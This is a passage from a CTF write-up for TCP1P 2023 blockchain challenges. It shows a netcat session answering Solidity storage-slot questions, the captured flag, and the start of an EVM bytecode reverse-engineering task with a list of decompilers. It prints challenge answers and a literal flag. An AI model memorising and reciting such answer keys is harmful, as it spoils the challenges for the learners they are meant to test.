&lt;p&gt;Similiarly calculated storage slots for all the 10 challenges manually.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;location$&lt;&#x2F;span&gt;&lt;span&gt; nc ctf.tcp1p.com 20005
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;===Going &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span&gt; The Party====
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;To&lt;&#x2F;span&gt;&lt;span&gt; Find the party location
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span&gt; need to solve a simple riddle regarding a SLOT
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer&lt;&#x2F;span&gt;&lt;span&gt; everything correctly, and find the exact location!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:&lt;&#x2F;span&gt;&lt;span&gt; In which Slot is Password Stored&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ll answer with and ONLY WITH [numbers]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;ex: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;0,1,2,3,4.....99
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Note: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;    -   Slot start from 0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;    -   If it doesn&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;t&lt;&#x2F;span&gt;&lt;span&gt; stored on SLOT, answer 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Identification&lt;&#x2F;span&gt;&lt;span&gt; Required for Guest
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge7 {
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private key;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes4 private key_1;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes16 private key_2;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private Token;
&lt;&#x2F;span&gt;&lt;span&gt;    address private immutable Investor;
&lt;&#x2F;span&gt;&lt;span&gt;    address private Courier;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private immuatble password;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge1 {
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private user;
&lt;&#x2F;span&gt;&lt;span&gt;    address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; private investor;
&lt;&#x2F;span&gt;&lt;span&gt;    uint64 private password;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge8 {
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private key;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes4 private key_1;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes16 private key_2;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private Token;
&lt;&#x2F;span&gt;&lt;span&gt;    address private immutable Investor;
&lt;&#x2F;span&gt;&lt;span&gt;    address private Courier;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private lump_sum;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private password;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge4 {
&lt;&#x2F;span&gt;&lt;span&gt;    uint64 private password;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private user;
&lt;&#x2F;span&gt;&lt;span&gt;    address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; private investor;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 immutable  passphrase
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge10 {
&lt;&#x2F;span&gt;&lt;span&gt;    bool private string_true;
&lt;&#x2F;span&gt;&lt;span&gt;    bool private number_false;
&lt;&#x2F;span&gt;&lt;span&gt;    bool private user_true;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private username;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private password;
&lt;&#x2F;span&gt;&lt;span&gt;    bool public status_creds;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge3 {
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;    uint64 private password;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private user;
&lt;&#x2F;span&gt;&lt;span&gt;    address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; private investor;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge2 {
&lt;&#x2F;span&gt;&lt;span&gt;    address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; private investor;
&lt;&#x2F;span&gt;&lt;span&gt;    uint64 private password;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private user;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge9 {
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private unique_code;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private 12_key;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;    address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; public player;
&lt;&#x2F;span&gt;&lt;span&gt;    bool private valid;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private password;
&lt;&#x2F;span&gt;&lt;span&gt;    address private enemy;
&lt;&#x2F;span&gt;&lt;span&gt;    bool private answered;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 24
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge5 {
&lt;&#x2F;span&gt;&lt;span&gt;    address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; private investor;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private user;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;    uint64 private password;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge6 {
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 immutable passphrase;
&lt;&#x2F;span&gt;&lt;span&gt;    uint64 private password;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private user;
&lt;&#x2F;span&gt;&lt;span&gt;    address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; private investor;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;==================================
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Final&lt;&#x2F;span&gt;&lt;span&gt; Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; Hell_0 {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private avail_money;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private saved_money;
&lt;&#x2F;span&gt;&lt;span&gt;    bool private not_minus;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; private geo_loc;
&lt;&#x2F;span&gt;&lt;span&gt;    bool private is_there;
&lt;&#x2F;span&gt;&lt;span&gt;    bool private there;
&lt;&#x2F;span&gt;&lt;span&gt;    address private wallet;
&lt;&#x2F;span&gt;&lt;span&gt;    address private receiver;
&lt;&#x2F;span&gt;&lt;span&gt;    address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; private transaction_list;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private user_creds;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private immutable user_in_uint;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private password;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private password_uint;
&lt;&#x2F;span&gt;&lt;span&gt;    bool private correct_password;
&lt;&#x2F;span&gt;&lt;span&gt;    bool private is_user;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer:&lt;&#x2F;span&gt;&lt;span&gt; 28
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Go&lt;&#x2F;span&gt;&lt;span&gt; to Camelleion Street 78
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;TCP1P{W00t_w00t_t0_th3_p4rty_47JHbddc&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can calculate the storage slots from remix too. Compile each contract on Remix and go to compilation details and view &lt;code&gt;STORAGELAYOUT&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;tcp1p23&#x2F;tcp1pctf23_location2.png&quot; class=&quot;autoimg&quot;&#x2F;&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : TCP1P{W00t_w00t_t0_th3_p4rty_47JHbddc}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;invitation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#invitation&quot; aria-label=&quot;Anchor link for: invitation&quot;&gt;Invitation&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;Description :&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;An Invitation to an amazing party, only if you find the right location.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Note: Please read the 101.txt.
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [Invitation.txt, 101.txt]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;101.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Description:
&lt;&#x2F;span&gt;&lt;span&gt;    You are provided a bytecode there, yeah?
&lt;&#x2F;span&gt;&lt;span&gt;    Find out a way to get a certain function name from it,
&lt;&#x2F;span&gt;&lt;span&gt;    the correct function name begin with &amp;quot;TCP1P&amp;quot; string.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Flag Format
&lt;&#x2F;span&gt;&lt;span&gt;    if you manage to find the correct function name
&lt;&#x2F;span&gt;&lt;span&gt;    do the exact same thing as the example below
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    Found Function name: TCP1P_th1s_1s_4_fl4g_()
&lt;&#x2F;span&gt;&lt;span&gt;        -&amp;gt; remove the &amp;quot;()&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        -&amp;gt; replace the first &amp;quot;_&amp;quot; with &amp;quot;{&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        -&amp;gt; replace the last &amp;quot;_&amp;quot; with &amp;quot;}&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    Final and Right flag format: TCP1P{th1s_1s_4_fl4g}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;Invitation.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;60806040526040518060400160405280601e81526020017f546865207269676874206f6e652068617320544350315020737472696e670000815250600090816200004a919062000483565b506040518060400160405280600681526020017f6e6f74206d6500000000000000000000000000000000000000000000000000008152506001908162000091919062000483565b506040518060400160405280601b81526020017f46756e6374696f6e2064623f206e6576657220686561726420656d000000000081525060029081620000d8919062000483565b506040518060400160405280601e81526020017f49742773206e6f7420746865207269676874207468696e67206e6f2e2e2e0000815250600390816200011f919062000483565b506040518060400160405280601081526020017f4841484148414841204e4f54204d4521000000000000000000000000000000008152506004908162000166919062000483565b506040518060400160405280601b81526020017f505553482050555348205055534821212120574841543f20343f20000000000081525060059081620001ad919062000483565b506040518060400160405280601881526020017f54686520342062797465732c206974277320666973687921000000000000000081525060069081620001f4919062000483565b503480156200020257600080fd5b506200056a565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806200028b57607f821691505b602082108103620002a157620002a062000243565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b6000600883026200030b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82620002cc565b620003178683620002cc565b95508019841693508086168417925050509392505050565b6000819050919050565b6000819050919050565b6000620003646200035e62000358846200032f565b62000339565b6200032f565b9050919050565b6000819050919050565b620003808362000343565b620003986200038f826200036b565b848454620002d9565b825550505050565b600090565b620003af620003a0565b620003bc81848462000375565b505050565b5b81811015620003e457620003d8600082620003a5565b600181019050620003c2565b5050565b601f8211156200043357620003fd81620002a7565b6200040884620002bc565b8101602085101562000418578190505b620004306200042785620002bc565b830182620003c1565b50505b505050565b600082821c905092915050565b6000620004586000198460080262000438565b1980831691505092915050565b600062000473838362000445565b9150826002028217905092915050565b6200048e8262000209565b67ffffffffffffffff811115620004aa57620004a962000214565b5b620004b6825462000272565b620004c3828285620003e8565b600060209050601f831160018114620004fb5760008415620004e6578287015190505b620004f2858262000465565b86555062000562565b601f1984166200050b86620002a7565b60005b8281101562000535578489015182556001820191506020850194506020810190506200050e565b8683101562000555578489015162000551601f89168262000445565b8355505b6001600288020188555050505b505050505050565b6106f1806200057a6000396000f3fe608060405234801561001057600080fd5b50600436106100b45760003560e01c8063937cc96711610071578063937cc96714610145578063b00d78a51461014f578063b8d6426714610159578063c3ea113614610177578063dcbc088514610195578063dd7f7b4b1461019f576100b4565b8063236ff8ab146100b9578063346dbadd146100d75780633d8a63e4146100f55780634adfcb1314610113578063795abd871461011d57806392dca47614610127575b600080fd5b6100c16101bd565b6040516100ce9190610639565b60405180910390f35b6100df61024b565b6040516100ec9190610639565b60405180910390f35b6100fd6102d9565b60405161010a9190610639565b60405180910390f35b61011b610367565b005b610125610369565b005b61012f61036b565b60405161013c9190610639565b60405180910390f35b61014d6103f9565b005b6101576103fb565b005b6101616103fd565b60405161016e9190610639565b60405180910390f35b61017f61048b565b60405161018c9190610639565b60405180910390f35b61019d610519565b005b6101a761051b565b6040516101b49190610639565b60405180910390f35b600480546101ca9061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546101f69061068a565b80156102435780601f1061021857610100808354040283529160200191610243565b820191906000526020600020905b81548152906001019060200180831161022657829003601f168201915b505050505081565b600680546102589061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546102849061068a565b80156102d15780601f106102a6576101008083540402835291602001916102d1565b820191906000526020600020905b8154815290600101906020018083116102b457829003601f168201915b505050505081565b600380546102e69061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546103129061068a565b801561035f5780601f106103345761010080835404028352916020019161035f565b820191906000526020600020905b81548152906001019060200180831161034257829003601f168201915b505050505081565b565b565b600580546103789061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546103a49061068a565b80156103f15780601f106103c6576101008083540402835291602001916103f1565b820191906000526020600020905b8154815290600101906020018083116103d457829003601f168201915b505050505081565b565b565b6000805461040a9061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546104369061068a565b80156104835780601f1061045857610100808354040283529160200191610483565b820191906000526020600020905b81548152906001019060200180831161046657829003601f168201915b505050505081565b600180546104989061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546104c49061068a565b80156105115780601f106104e657610100808354040283529160200191610511565b820191906000526020600020905b8154815290600101906020018083116104f457829003601f168201915b505050505081565b565b600280546105289061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546105549061068a565b80156105a15780601f10610576576101008083540402835291602001916105a1565b820191906000526020600020905b81548152906001019060200180831161058457829003601f168201915b505050505081565b600081519050919050565b600082825260208201905092915050565b60005b838110156105e35780820151818401526020810190506105c8565b60008484015250505050565b6000601f19601f8301169050919050565b600061060b826105a9565b61061581856105b4565b93506106258185602086016105c5565b61062e816105ef565b840191505092915050565b600060208201905081810360008301526106538184610600565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806106a257607f821691505b6020821081036106b5576106b461065b565b5b5091905056fea2646970667358221220746841f27e5037f89c15c7d04d5c1102b534a6fc0a7d4297aaa71c7392bedfd164736f6c63430008120033
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay, We have enough Information from &lt;code&gt;101.txt&lt;&#x2F;code&gt;. And we are given a EVM bytecode of the contract in &lt;code&gt;Invitation.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Our Goal :&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Get the function name which starts with &lt;code&gt;TCP1P&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Observations :&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;We have only the bytecode of the challenge&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;What can we do? Can we decompile bytecode into readable solidity contract?&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Yes, We can get &lt;code&gt;OP codes&lt;&#x2F;code&gt; and somewhat readable contract by using some decompiling tools. Here is the list of few EVM bytecode Decompilers&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;library.dedaub.com&#x2F;&quot; target=_blank&gt;Dedaub&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;ethervm.io&#x2F;decompile&quot; target=_blank&gt;EtherVM&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;palkeo&#x2F;panoramix&quot; target=_blank&gt;Panoramix&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Jon-Becker&#x2F;heimdall-rs&quot; target=_blank&gt;Heimdall&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;code&gt;Dedaub&lt;&#x2F;code&gt; is many folks favourite and free to use. So, we can decompile our bytecode using Dedaub online decompiler.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Before decompiling lets see how function names stores in bytecode&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
